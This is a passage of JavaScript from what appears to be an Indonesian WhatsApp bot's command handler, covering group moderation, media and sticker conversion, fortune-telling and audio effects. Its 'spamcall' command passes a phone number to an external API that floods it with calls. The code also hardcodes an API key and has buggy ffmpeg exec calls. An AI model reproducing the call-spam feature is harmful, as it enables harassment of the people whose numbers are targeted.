if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isWelcome) return reply('Sudah aktif✓')
welcomeJson.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Suksess mengaktifkan welcome di group:\n'+groupName)
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
welcomeJson.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(welcomeJson))
reply('Success menonaktifkan welcome di group:\n'+groupName)
} else { reply('Kata kunci tidak ditemukan!') }
}
break

case 'antilink':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAntiLink) return reply('Antilink sudah aktif')
antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Activate Antilink In This Group')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAntiLink) return reply('Antilink belum aktif')
antilink.splice(anu, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(antilink, null, 2))
reply('Successfully Disabling Antilink In This Group')
} else { reply('Kata kunci tidak ditemukan!') }
}
break

case 'promote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "promote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai admin`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan member yang ingin dijadikan admin\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

case 'tiktokauto':{
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (!args[0]) return reply(`Kirim perintah #${command} _options_\nOptions : on & off\nContoh : #${command} on`)
if (args[0] == 'ON' || args[0] == 'on' || args[0] == 'On') {
if (isAutoDownTT) return reply('Auto download tiktok sudah aktif')
auto_downloadTT.push(from)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mengaktifkan auto download tiktok')
} else if (args[0] == 'OFF' || args[0] == 'OF' || args[0] == 'Of' || args[0] == 'Off' || args[0] == 'of' || args[0] == 'off') {
if (!isAutoDownTT) return reply('Auto download tiktok belum aktif')
auto_downloadTT.splice(anu, 1)
fs.writeFileSync('./database/tiktokDown.json', JSON.stringify(auto_downloadTT, null, 2))
reply('Berhasil mematikan auto download tiktok')
} else { reply('Kata kunci tidak ditemukan!') }
}
break

case 'demote':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins) return reply(mess.GrupAdmin)
if (!isBotGroupAdmins) return reply(mess.BotAdmin)
if (mentionUser.length !== 0) {
conn.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
.then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
.catch(() => reply(mess.error.api))
} else if (isQuotedMsg) {
conn.groupParticipantsUpdate(from, [quotedMsg.sender], "demote")
.then( res => { mentions(`Sukses menjadikan @${quotedMsg.sender.split("@")[0]} sebagai member biasa`, [quotedMsg.sender], true) })
.catch(() => reply(mess.error.api))
} else {
reply(`Tag atau balas pesan admin yang ingin dijadikan member biasa\n\n*Contoh:*\n${prefix+command} @tag`)
}
break

case 'infogc':
case 'infogrup':
case 'infogroup':
if (cekUser("id", sender) == null) return daftarDlu()
if (!isGroup) return reply(mess.OnlyGrup)
let cekgcnya =`*INFO GROUP*
• *ID:* ${from}
• *Name:* ${groupName}
• *Member:* ${groupMembers.length}
• *Total Admin:* ${groupAdmins.length}
• *Welcome:* ${isWelcome? "aktif":"tidak"}
• *Antilink:* ${isAntiLink? "aktif":"tidak"}
• *Tiktok Auto:* ${isAutoDownTT? "aktif":"tidak"}`
reply(cekgcnya)
break

case 'text_grup':{
const reactionMessage = { react: { text: "🗿", key: msg.key}}
conn.sendMessage(from, reactionMessage)
}
break

case 'tourl': 
case 'upload':
if (cekUser("id", sender) == null) return daftarDlu()
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, 'sticker', `./sticker/${sender.split("@")[0]}.webp`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Sticker`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
fs.unlinkSync(rand2)
} else if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
var rand2 = 'sticker/'+getRandom('.mp4')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Video`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp4`)
fs.unlinkSync(rand2)
} else if (isImage || isQuotedImage){
var mediany = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split("@")[0]}.jpg`)
reply(mess.wait)
let buffer_up = fs.readFileSync(mediany)
var rand2 = 'sticker/'+getRandom('.png')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Image`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(mediany)
fs.unlinkSync(rand2)
} else if (isQuotedAudio){
await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${sender.split("@")[0]}.mp3`)
reply(mess.wait)
let buffer_up = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp3`)
var rand2 = 'sticker/'+getRandom('.mp3')
fs.writeFileSync(`./${rand2}`, buffer_up)
var { name, url, size } = await UploadFileUgu(rand2)
let sizeNy = bytesToSize(size)
var teks = `*UPLOAD SUKSES*\n*Url :* ${url}\n*Name :* ${name}\n*Size :* ${sizeNy}\n*Type:* Audio`
conn.sendMessage(from, {text:teks}, {quoted:msg})
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.mp3`)
fs.unlinkSync(rand2)
} else {
reply(`*reply audio/video/sticker/gambar dengan pesan ${prefix+command}*`)
}
break

case 'tomp3':
case 'toaudio':
if (cekUser("id", sender) == null) return daftarDlu()
if (isVideo || isQuotedVideo){
await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
let ran = './sticker/'+getRandom('.mp3')
fs.writeFileSync(`./${ran}`, media)
exec(`ffmpeg -i ${media} ${ran}`)
conn.sendMessage(from, { audio: fs.readFileSync(ran),  mimetype: 'audio/mp4', fileName: `${sender.split("@")[0]}ToMp3`, ptt: args[1] == '--ptt' ? true : false }, { quoted: msg })
fs.unlinkSync(ran)
fs.unlinkSync(media)
} else {
reply(`*Reply video dengan pesan ${prefix+command}*`)
}
break

case 'base64':
case 'base32':{
if (!q) return reply(`Example :\n${prefix+command} Lexxy`)
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=${command}&encode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.encode}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break

case 'debase64':{
if (!q) return reply(`Example :\n${prefix+command} cA==`)
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base64&decode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break

case 'debase32':{
reply(mess.wait)
var yogi = await fetchJson(`https://api-yogipw.herokuapp.com/api/base?type=base32&decode=${q}`)
var text_encode =`*Hasil Result*
 *type:* ${yogi.result.type}
 *encode:* ${yogi.result.enc}
 *string:* ${yogi.result.string}`
reply(text_encode)
}
break

// CONVERT
case 'toimg': 
case 'toimage':
if (cekUser("id", sender) == null) return daftarDlu()
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.webp`)
var rand1 = 'sticker/'+getRandom('.webp')
var rand2 = 'sticker/'+getRandom('.png')
fs.writeFileSync(`./${rand1}`, buffer)
reply(mess.wait)
exec(`ffmpeg -i ./${rand1} ./${rand2}`, (err) => {
fs.unlinkSync(`./${rand1}`)
if (err) return reply(mess.error.api)
conn.sendMessage(from, {caption: `*Sticker Convert To Image!*`, image: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.webp`)
})
} else {
reply('*Reply sticker nya dengan pesan #toimg*\n\n*Atau bisa sticker gif dengan pesan #tovideo*')
}
break

case 'tomp4': 
case 'tovideo':
if (cekUser("id", sender) == null) return daftarDlu()
if (isSticker || isQuotedSticker){
await conn.downloadAndSaveMediaMessage(msg, "sticker", `./sticker/${sender.split("@")[0]}.webp`)
let buffer = `./sticker/${sender.split("@")[0]}.webp`
reply(mess.wait)
let webpToMp4 = await webp2mp4File(buffer)
conn.sendMessage(from, { video: {url:webpToMp4.result}, caption: 'Convert Webp To Video'}, { quoted: msg })
fs.unlinkSync(buffer)
} else {
reply('*Reply sticker gif dengan pesan #tovideo*')
}
break

case 'emojimix':
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Kirim perintah ${command} emoji1+emoji2\ncontoh : !${command} 😜+😅`)
if (!q.includes('+')) return reply(`Format salah, contoh pemakaian !${command} 😅+😭`)
var emo1 = q.split("+")[0]
var emo2 = q.split("+")[1]
if (!isEmoji(emo1) || !isEmoji(emo2)) return reply(`Itu bukan emoji!`)
fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emo1)}_${encodeURIComponent(emo2)}`)
.then(data => {
var opt = { packname: setting.sticker.packname, author: setting.sticker.author }
conn.sendImageAsSticker(from, data.results[0].url, msg, opt)
}).catch((e) => reply(mess.error.api))
break

case 'emojimix2': {
if (!q) return reply(`Example : ${prefix + command} 😅`)
let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(q)}`)
for (let res of anu.results) {
var opt = { packname: setting.sticker.packname, author: setting.sticker.author }
let encmedia = await conn.sendImageAsSticker(from, res.url, msg, opt)
}
}
break

case 'smeme':
case 'stikermeme':
case 'stickermeme':
if (cekUser("id", sender) == null) return daftarDlu()
var atas = q.split('|')[0]
var bawah = q.split('|')[1]
if (!atas) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (!bawah) return reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
if (isImage || isQuotedImage){
reply(mess.wait)
var media = await conn.downloadAndSaveMediaMessage(msg, 'image', `./sticker/${sender.split('@')[0]}.jpg`)
var media_url = (await UploadFileUgu(media)).url
var meme_url = `https://api.memegen.link/images/custom/${encodeURIComponent(atas)}/${encodeURIComponent(bawah)}.png?background=${media_url}`
var opt = { packname: setting.sticker.packname, author: setting.sticker.author }
conn.sendImageAsSticker(from, meme_url, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} text_atas|text_bawah atau balas gambar yang sudah dikirim`)
}
break

case 'swm':
case 'wm':
if (cekUser("id", sender) == null) return daftarDlu()
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
var pname = q.split('|')[0]
var athor = q.split('|')[1]
reply(mess.wait)
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
var media = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
reply(mess.wait)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else if (isVideo || isQuotedVideo) {
reply(mess.wait)
var media = await conn.downloadAndSaveMediaMessage(msg, 'video', `./sticker/${sender}.jpeg`)
var opt = { packname: pname, author: athor }
conn.sendImageAsSticker(from, media, msg, opt)
fs.unlinkSync(media)
} else {
reply(`Kirim video/foto dengan caption ${prefix+command} packname|author atau balas video/foto yang sudah dikirim`)
}
break

case 'sticker': case 's': case 'stiker':
if (cekUser("id", sender) == null) return daftarDlu()
if (isImage || isQuotedImage){
await conn.downloadAndSaveMediaMessage(msg, "image", `./sticker/${sender.split("@")[0]}.jpeg`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.jpeg`)
reply(mess.wait)
var rand1 = 'sticker/'+getRandom('.jpeg')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./sticker/${sender.split("@")[0]}.jpeg`)
fs.unlinkSync(`./${rand2}`)})}).addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"]).toFormat('webp').save(`${rand2}`)
} else {
reply(`Kirim gambar dengan caption ${prefix+command} atau balas gambar yang sudah dikirim`)
}
break

case 'sgif':
case 'stickergif':
case 'stikergif':
if (cekUser("id", sender) == null) return daftarDlu()
if (isVideo && msg.message.videoMessage.seconds < 10 || isQuotedVideo && quotedMsg.videoMessage.seconds < 10) {
await conn.downloadAndSaveMediaMessage(msg, "video", `./sticker/${sender.split("@")[0]}.mp4`)
let buffer = fs.readFileSync(`./sticker/${sender.split("@")[0]}.mp4`)
reply(mess.wait)
var rand1 = 'sticker/'+getRandom('.mp4')
var rand2 = 'sticker/'+getRandom('.webp')
fs.writeFileSync(`${rand1}`, buffer)
ffmpeg(`./${rand1}`)
.on("error", console.error)
.on("end", () => {
exec(`webpmux -set exif ./sticker/data.exif ./${rand2} -o ./${rand2}`, async (error) => {
conn.sendMessage(from, { sticker: fs.readFileSync(`./${rand2}`) }, { quoted: msg })
fs.unlinkSync(`./${rand1}`)
fs.unlinkSync(`./${rand2}`)
fs.unlinkSync(buffer)
})
})
.addOutputOptions(["-vcodec", "libwebp", "-vf", "scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse"])
.toFormat('webp')
.save(`${rand2}`)
} else {
reply(`Kirim video dengan caption ${prefix+command} atau balas video yang sudah dikirim`)
}
break

// PREMIUM ONLY
// BIAR GAK DI SPAM

case 'spamcall':{
if (cekUser("id", sender) == null) return daftarDlu()
if (cekUser("premium", sender) == false) return reply(mess.OnlyPrem)
if (!q) return reply(`Kirim perintah\n#${command} nomor\n\nContoh? #${command} 8xxxx\nNomor awal dari 8 bukan 62/08`)
var data = await fetchJson(`https://arugaz.herokuapp.com/api/spamcall?no=${q}`).catch(() => reply(mess.error.api))
if (data.status == false) {
reply(data.msg)
} else {
reply(data.logs)
}
}
break
// LOGO MAKER
case 'girlneko': 
case 'gilrneko':
if (cekUser("id", sender) == null) return daftarDlu()
if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #girlneko aku&kamu")
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/girlneko?text1=${q1}&text2=${q2}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break

case 'sadboy':
if (cekUser("id", sender) == null) return daftarDlu()
if (!q1 && !q2) return reply("Masukkan text1&text2\nContoh? #sadboy aku&kamu")
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/sadboy?text1=${q1}&text2=${q2}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break

case 'kaneki': 
case 'rem': 
case 'lolimaker':
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Masukkan text\nContoh: #${command} bot`)
reply("[❗] SEDANG DIPROSES")
conn.sendMessage(from, {image:{url:`https://ziy.herokuapp.com/api/maker/${command}?nama=${q}&apikey=xZiyy`}, caption:"done!!", mentions:[sender]},{quoted:msg})
break

case 'lick':case 'kiss':case 'awoo':case 'hug':case 'cry':case 'cuddle':case 'bully':case 'megumin':case 'shinobu':case 'neko':case 'slap':case 'wink':case 'dance':case 'poke':case 'glomp':case 'bite':case 'nom':case 'handhold':case 'highfive':case 'wave':case 'smile':case 'yeet':case 'bonk':case 'smug':case 'pat': case 'kill': case 'blush': case 'happy': case 'cringe':
if (cekUser("id", sender) == null) return daftarDlu()
reply(mess.wait)
var kkk = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
var encmedia = await conn.sendImageAsSticker(from, kkk.url, msg, { packname: setting.sticker.packname, author: setting.sticker.author, })
await fs.unlinkSync(encmedia)
break

// PRIMBON
case 'ramalanjodoh': case 'ramaljodoh': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_jodoh(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'nomorhoki':{
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Example :\n${prefix+command} 62895340684706`)
let anu = await primbon.nomer_hoki(q)
if (anu.status == false) return reply(anu.message)
reply (`> *Nomor HP :* ${anu.message.nomer_hp}\n> *Angka Shuzi :* ${anu.message.angka_shuzi}\n> *Energi Positif :*\n- Kekayaan : ${anu.message.energi_positif.kekayaan}\n- Kesehatan : ${anu.message.energi_positif.kesehatan}\n- Cinta : ${anu.message.energi_positif.cinta}\n- Kestabilan : ${anu.message.energi_positif.kestabilan}\n- Persentase : ${anu.message.energi_positif.persentase}\n> *Energi Negatif :*\n- Perselisihan : ${anu.message.energi_negatif.perselisihan}\n- Kehilangan : ${anu.message.energi_negatif.kehilangan}\n- Malapetaka : ${anu.message.energi_negatif.malapetaka}\n- Kehancuran : ${anu.message.energi_negatif.kehancuran}\n- Persentase : ${anu.message.energi_negatif.persentase}`)
}
break
case 'artimimpi': case 'tafsirmimpi': {
if (cekUser("id", sender) == null) return daftarDlu()
 if (!q) return reply( `Example :\n${prefix+command} belanja`)
let anu = await primbon.tafsir_mimpi(q)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Mimpi :* ${anu.message.mimpi}\n> *Arti :* ${anu.message.arti}\n> *Solusi :* ${anu.message.solusi}`)
}
break
case 'ramalanjodohbali': case 'ramaljodohbali': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply( `Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_jodoh_bali(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'suamiistri': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply( `Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.suami_istri(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return m.reply(anu.message)
reply(`> *Nama Suami :* ${anu.message.suami.nama}\n> *Lahir Suami :* ${anu.message.suami.tgl_lahir}\n> *Nama Istri :* ${anu.message.istri.nama}\n> *Lahir Istri :* ${anu.message.istri.tgl_lahir}\n> *Hasil :* ${anu.message.result}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'ramalancinta': case 'ramalcinta': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Example :\n${prefix+command} Yanto, 7, 7, 2005, Yanti, 16, 11, 2004`)
let [nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2] = q.split`,`
let anu = await primbon.ramalan_cinta(nama1, tgl1, bln1, thn1, nama2, tgl2, bln2, thn2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda.nama}\n> *Lahir Anda :* ${anu.message.nama_anda.tgl_lahir}\n> *Nama Pasangan :* ${anu.message.nama_pasangan.nama}\n> *Lahir Pasangan :* ${anu.message.nama_pasangan.tgl_lahir}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'artinama':{
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Example :\n${prefix+command} Yanto`)
let anu = await primbon.arti_nama(text)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama :* ${q}\n> *Arti :* ${anu.message.arti}\n> *Catatan :* ${anu.message.catatan}`)
}
break
case 'kecocokannama': case 'cocoknama': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply( `Example :\n${prefix+command} yanto, 7, 7, 2005`)
let [nama, tgl, bln, thn] = q.split`,`
let anu = await primbon.kecocokan_nama(nama, tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama :* ${anu.message.nama}\n> *Lahir :* ${anu.message.tgl_lahir}\n> *Life Path :* ${anu.message.life_path}\n> *Destiny :* ${anu.message.destiny}\n> *Destiny Desire :* ${anu.message.destiny_desire}\n> *Personality :* ${anu.message.personality}\n> *Persentase :* ${anu.message.persentase_kecocokan}`)
}
break
case 'kecocokanpasangan': case 'cocokpasangan': case 'pasangan': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Example :\n${prefix+command} yanto|yanti`)
let [nama1, nama2] = q.split`|`
let anu = await primbon.kecocokan_nama_pasangan(nama1, nama2)
if (anu.status == false) return reply(anu.message)
reply(`> *Nama Anda :* ${anu.message.nama_anda}\n> *Nama Pasangan :* ${anu.message.nama_pasangan}\n> *Sisi Positif :* ${anu.message.sisi_positif}\n> *Sisi Negatif :* ${anu.message.sisi_negatif}`)
}
break
case 'sifatusaha': {
if (cekUser("id", sender) == null) return daftarDlu()
if (!q) return reply(`Example : ${prefix+command} 24, 10, 2005`)
let [tgl, bln, thn] = q.split`,`
let anu = await primbon.sifat_usaha_bisnis(tgl, bln, thn)
if (anu.status == false) return reply(anu.message)
reply(`> *Lahir :* ${anu.message.hari_lahir}\n> *Usaha :* ${anu.message.usaha}`)
}
break
case 'halah': case 'hilih': case 'huluh': case 'heleh': case 'holoh': 
if (cekUser("id", sender) == null) return daftarDlu()
if (!quoted && !q) reply(`Kirim/reply text dengan caption *${prefix+command}*`)
var ter = command[0].toLowerCase()
var tex = quoted ? quoted.text ? quoted.text : q ? q : text : q ? q : text
reply(tex.replace(/[aiueo]/g, ter).replace(/[AIUEO]/g, ter.toUpperCase()))
break

// AUDIO CHANGER
case 'bass':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af equalizer=f=54:width_type=o:width=2:g=20'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'blown':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af acrusher=.1:1:64:0:log'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'deep':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af atempo=4/4,asetrate=44500*2/3'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'earrape':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-af volume=12'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fast':{
if (cekUser("id", sender) == null) return daftarDlu()
if (isQuotedAudio){
var buffer = await conn.downloadAndSaveMediaMessage(msg, 'audio', `./sticker/${command}.mp3`)
let ran = 'sticker/'+getRandom('.mp3')
var kode_js = '-filter:a "atempo=1.63,asetrate=44100"'
exec(`ffmpeg -i ${buffer} ${kode_js} ${ran}`, (err, stderr, stdout) => {
if (err) return reply(err)
reply(mess.wait)
let buff = fs.readFileSync(ran)
conn.sendMessage(from, { audio: buff, mimetype: 'audio/mpeg' }, { quoted : msg })
fs.unlinkSync(`./${ran}`)
fs.unlinkSync(`./${buffer}`)
})
} else {
reply(`Balas audio yang ingin diubah dengan caption *#${command}*`)
}
}
break

case 'fat':{
